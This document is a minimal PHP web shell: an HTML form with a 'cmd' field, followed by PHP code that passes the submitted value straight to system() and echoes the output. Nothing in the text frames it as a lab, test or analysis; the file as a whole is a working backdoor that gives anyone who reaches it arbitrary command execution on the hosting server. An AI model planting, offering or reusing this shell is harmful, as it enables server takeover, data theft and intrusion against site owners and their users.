<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

<body>
  <form method="get">
    <input name="cmd">
    <button type="submit">submit</button>
  </form>
</body>

</html>

<?php
  echo system($_GET['cmd']);
?>